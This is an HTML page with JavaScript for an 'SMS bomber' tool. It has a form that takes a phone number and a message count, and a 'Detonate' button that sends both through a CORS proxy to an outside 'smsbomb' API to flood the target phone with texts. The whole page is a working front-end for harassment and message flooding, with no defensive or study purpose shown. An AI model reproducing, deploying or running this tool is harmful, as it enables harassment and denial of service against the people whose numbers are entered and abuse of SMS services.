<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SMS BOMBER</title>
  
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
  body {
    font-family: "Poppins", sans-serif;
    background: linear-gradient(135deg, #ff5a5a, #ffb347, #ff6f91);
    background-size: 400% 400%;
    animation: gradientFlow 12s ease infinite;
    margin: 0;
    padding: 0;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    overflow-x: hidden;
  }

  @keyframes gradientFlow {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  .float {
    position: absolute;
    border-radius: 50%;
    filter: blur(20px);
    opacity: 0.5;
    animation: floaty 10s infinite ease-in-out;
    z-index: 0;
  }
  @keyframes floaty {
    0% { transform: translateY(0px); }
    50% { transform: translateY(-50px); }
    100% { transform: translateY(0px); }
  }
  .c1 { width: 150px; height: 150px; background:#fff; top: 10%; left: 5%; }
  .c2 { width: 120px; height: 120px; background:#ffddcc; bottom: 15%; right: 10%; }
  .c3 { width: 180px; height: 180px; background:#ccffff; bottom: 25%; left: 25%; }

  h1 {
    font-size: 2.8em;
    margin-bottom: 30px;
    background: linear-gradient(90deg, #fff, #fffcaa);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    text-shadow: 0px 0px 25px rgba(255,255,255,0.9);
    display: flex;
    gap: 12px;
    align-items: center;
    justify-content: center;
    text-align: center;
    flex-wrap: wrap;
    z-index: 1;
  }
  h1 i { color: #ffeb3b; text-shadow: 0 0 15px #fff200; }

  .container {
    width: 95%;
    max-width: 480px;
    padding: 35px 25px;
    border-radius: 30px;
    background: rgba(0,0,0,0.4);
    backdrop-filter: blur(18px);
    border: 2px solid rgba(255,255,255,0.3);
    box-shadow: 0 0 35px rgba(0,0,0,0.6);
    position: relative;
    z-index: 1;
  }

  label {
    font-weight: 600;
    margin-top: 20px;
    display: block;
    color: #fff;
  }

  .input-box {
    position: relative;
    width: 100%;
    margin-top: 8px;
    margin-bottom: 18px;
  }

  .input-box i {
    position: absolute;
    top: 50%;
    left: 15px;
    transform: translateY(-50%);
    color: #ffeb3b;
    font-size: 20px;
  }

  input {
    width: 86%;
    padding: 16px 15px 16px 50px;
    border-radius: 18px;
    border: none;
    outline: none;
    font-size: 16px;
    background: rgba(255,255,255,0.2);
    color: #fff;
    box-shadow: inset 0 0 12px rgba(255,255,255,0.3), 0 5px 15px rgba(0,0,0,0.3);
    transition: 0.3s;
  }
  input:focus { background: rgba(255,255,255,0.3); box-shadow: inset 0 0 15px rgba(255,255,255,0.5), 0 6px 20px rgba(0,0,0,0.4); }

  button {
    width: 100%;
    padding: 20px;
    margin-top: 25px;
    border: none;
    border-radius: 20px;
    font-size: 18px;
    font-weight: bold;
    background: linear-gradient(145deg, #ff4e4e, #ff7070);
    color: #fff;
    cursor: pointer;
    transition: 0.3s;
    box-shadow: 0 6px 18px rgba(255,0,0,0.6);
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
  }
  button:hover {
    transform: scale(1.03) translateY(-2px);
    box-shadow: 0 8px 25px rgba(255,0,0,0.8);
  }
  button i { font-size: 22px; }

  .console {
    margin-top: 25px;
    background: rgba(0,0,0,0.85);
    border-radius: 20px;
    padding: 18px;
    height: 230px;
    overflow-y: auto;
    font-family: "Courier New", monospace;
    font-size: 14px;
    color: #fffa9d;
    box-shadow: inset 0 0 15px rgba(255,255,255,0.2);
  }
  .log { color: #00ff9d; }
  .info { color: #ffd966; }
  .error { color: #ff6b6b; }

  .loading {
    display: inline-block;
    width: 20px;
    height: 20px;
    border: 3px solid rgba(255,255,255,0.3);
    border-radius: 50%;
    border-top-color: #ffffff;
    animation: spin 1s infinite linear;
    margin-right: 10px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  @media (max-width: 480px) {
    h1 { font-size: 2.2em; }
    .container { padding: 25px 15px; }
    input { font-size: 15px; padding: 14px 14px 14px 45px; }
    button { font-size: 16px; padding: 18px; }
    .console { height: 200px; font-size: 13px; padding: 12px; }
  }
</style>
</head>
<body>

<div class="float c1"></div>
<div class="float c2"></div>
<div class="float c3"></div>

<h1><i class="fa-solid fa-bomb"></i> SMS BOMBER <i class="fa-solid fa-bomb"></i></h1>

<div class="container">
  <form id="apiForm">
    <label><i class="fa-solid fa-phone"></i> Phone Number:</label>
    <div class="input-box">
      <i class="fa-solid fa-mobile-screen"></i>
      <input type="text" id="number" placeholder="e.g. +639123456789" required>
    </div>

    <label><i class="fa-solid fa-coins"></i> Amount:</label>
    <div class="input-box">
      <i class="fa-solid fa-hashtag"></i>
      <input type="number" id="amount" placeholder="e.g. 10" min="1" required>
    </div>

    <button type="submit" id="submitBtn">
      <i class="fa-solid fa-bomb"></i>
      <span id="btnText">Detonate</span>
    </button>
  </form>

  <div class="console" id="consoleBox">
    <div class="info"><i class="fa-solid fa-circle-check"></i> Ready to Launch</div>
  </div>
</div>

<script>
const logBox = document.getElementById("consoleBox");
const btn = document.getElementById("submitBtn");
const btnText = document.getElementById("btnText");

function log(msg, type="log") {
  const line = document.createElement("div");
  line.className = type;
  line.innerHTML = "> " + msg;
  logBox.appendChild(line);
  logBox.scrollTop = logBox.scrollHeight;
}

function clearConsole() {
  logBox.innerHTML = '<div class="info"><i class="fa-solid fa-circle-check"></i> Ready to Launch</div>';
}

document.getElementById("apiForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const number = document.getElementById("number").value.trim();
  const amount = Number(document.getElementById("amount").value);

  if (!number || amount < 1) {
    log("Invalid input!", "error");
    return;
  }

  btn.disabled = true;
  btnText.innerHTML = '<div class="loading"></div>Detonating...';
  clearConsole();
  log("Preparing payload...", "info");

  const proxyUrl = "https://cors-anywhere.herokuapp.com/";
const apiUrl = proxyUrl + "https://sms-tanginamoka-api-ryujin.vercel.app/api/smsbomb" +
                 "?number=" + encodeURIComponent(number) +
                 "&amount=" + encodeURIComponent(amount);
  
  setTimeout(async () => {
    log("Sending request to server...", "info");
    try {
      const response = await fetch(apiUrl);
      const data = await response.json();
      log("Request successful!", "log");
      log("Server Response: " + JSON.stringify(data), "info");
    } catch (err) {
      log("Network Error: " + err.message, "error");
    }
    btn.disabled = false;
    btnText.textContent = "Detonate";
  }, 1800);
});
</script>

</body>
</html>
